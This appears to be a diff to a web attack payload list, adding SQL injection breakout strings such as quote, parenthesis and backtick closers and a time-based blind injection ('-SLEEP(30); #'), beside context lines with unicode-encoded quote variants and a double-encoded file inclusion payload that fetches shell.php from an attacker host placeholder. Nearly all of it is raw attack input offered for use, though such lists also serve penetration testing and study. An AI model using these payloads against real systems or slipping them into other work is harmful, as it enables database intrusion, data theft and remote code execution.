@@ -143,6 +143,19 @@ ftp:%252f%252f<ATTACKER-IP>%252fshell.php
 '-- -
 ')-- -
 ")-- -
+)'
+"
+`
+')
+")
+`)
+'))
+"))
+`))
+
+'-SLEEP(30); #
+
+
 == UTF-8 encoding
 %EF%BC%87 or %EF%BC%87 1 %EF%BC%87 = %EF%BC%87 1
 %EF%BC%82 or %EF%BC%82 1 %EF%BC%82 = %EF%BC%82 1
